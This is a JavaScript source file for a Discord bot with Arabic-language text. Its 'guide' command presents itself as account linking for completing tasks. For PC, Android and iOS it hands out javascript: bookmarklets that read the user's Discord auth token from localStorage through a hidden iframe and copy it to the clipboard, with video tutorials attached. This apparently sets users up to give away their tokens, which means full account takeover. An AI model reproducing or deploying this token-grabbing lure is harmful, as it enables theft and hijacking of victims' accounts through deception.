import {
    SlashCommandBuilder,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    EmbedBuilder,
    MessageFlags,
} from 'discord.js';


const PC_VIDEO_LINK = 'https://cdn.discordapp.com/attachments/1470058692660428842/1542354901202501722/1787760131788714.mov?ex=6ab92330&is=6ab7d1b0&hm=0d0fb6872ab428e04169f63cc4790b76ecc3ca6b9e7a20b8d116c455a74ab512&';
const MOBILE_VIDEO_LINK = 'https://cdn.discordapp.com/attachments/1539722714036699276/1542207446423048342/lv_0_20260826215752.mp4';

const PC_TOKEN_SCRIPT = `javascript:(function(){var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var t=i.contentWindow.localStorage.token;if(t){try{t=JSON.parse(t)}catch(e){}var ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();var n=document.createElement('div');n.innerHTML='<strong>تم نسخ الرمز</strong><br>Your token has been copied to clipboard';n.style.cssText='position:fixed;top:20px;left:20px;background:#1a1a2e;color:#e94560;padding:15px 20px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.5);font-family:Arial,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s;';document.body.appendChild(n);setTimeout(function(){n.style.opacity='1';},50);setTimeout(function(){n.style.opacity='0';setTimeout(function(){n.remove();},500);},3500)}else{alert('No token found. Make sure you are logged into Discord on this browser.');}})();`;

const ANDROID_TOKEN_SCRIPT = `javascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);let ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();let n=document.createElement('div');n.innerHTML='<strong>تم نسخ الرمز</strong><br>Your token has been copied to clipboard';n.style.cssText='position:fixed;top:20px;left:20px;background:#001f3f;color:#7FDBFF;padding:12px 16px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.4);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s ease-in-out;';document.body.appendChild(n);setTimeout(()=>n.style.opacity='1',50);setTimeout(()=>n.style.opacity='0',3500);setTimeout(()=>n.remove(),4000);}catch(e){alert('Error copying token');}})();`;

const IOS_TOKEN_SCRIPT = `javascript:(function(){try{var i=document.createElement('iframe');document.body.appendChild(i);var t=JSON.parse(i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1'));navigator.clipboard.writeText(t).then(function(){var d=document.createElement('div');d.innerHTML='<strong>تم نسخ الرمز</strong><br>Your token has been copied to clipboard';Object.assign(d.style,{position:'fixed',top:'10px',left:'10px',background:'#d4edda',color:'#155724',padding:'10px',border:'1px solid #c3e6cb',borderRadius:'5px',zIndex:99999,fontFamily:'sans-serif'});document.body.appendChild(d);setTimeout(()=>d.remove(),3000);});}catch(e){alert('Failed to copy token: '+e);}})();`;

export const deviceButtonsRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('btn_ios').setLabel('iOS').setEmoji('🍎').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('btn_android').setLabel('جوال').setEmoji('📱').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('btn_pc').setLabel('كمبيوتر').setEmoji('💻').setStyle(ButtonStyle.Secondary),
);

function buildScriptHelpCard() {
    return new EmbedBuilder()
        .setColor(0x2B2D31)
        .setDescription(
            `# 💙 طريقة ربط الحساب\n\n` +
            `اتبع التعليمات التالية للحصول على رمز حسابك وإكمال المهام.\n\n` +
            `اختر جهازك، وبعد الضغط على الزر راح توصلك الخطوات كاملة.`
        );
}

export const guideCmd = {
    data: new SlashCommandBuilder()
        .setName('guide')
        .setDescription('عرض طريقة ربط الحساب'),
    prefix: 'guide',
    async prefixExecute(message, _args, _client) {
        await message.reply({ embeds: [buildScriptHelpCard()], components: [deviceButtonsRow] });
    },
    async execute(interaction, _client) {
        await interaction.reply({ embeds: [buildScriptHelpCard()], components: [deviceButtonsRow], flags: MessageFlags.Ephemeral });
    }
};

export async function handleGuideButtons(interaction) {
    if (!interaction.isButton()) return;
    const customId = interaction.customId;
    if (customId !== 'btn_pc' && customId !== 'btn_android' && customId !== 'btn_ios') return;

    let scriptText = '';
    let videoLink = '';
    let guideTitle = '';

    if (customId === 'btn_pc') {
        scriptText = PC_TOKEN_SCRIPT;
        videoLink = PC_VIDEO_LINK;
        guideTitle = '💻 كمبيوتر Guide';
    } else if (customId === 'btn_android') {
        scriptText = ANDROID_TOKEN_SCRIPT;
        videoLink = MOBILE_VIDEO_LINK;
        guideTitle = '📱 جوال Guide (Android)';
    } else if (customId === 'btn_ios') {
        scriptText = IOS_TOKEN_SCRIPT;
        videoLink = MOBILE_VIDEO_LINK;
        guideTitle = '🍎 شرح iOS';
    }

    await interaction.reply({
        content: `### 📌 ${guideTitle}\n\`${scriptText}\`\n[شاهد الشرح](${videoLink})`,
        flags: MessageFlags.Ephemeral
    }).catch(() => {});
}
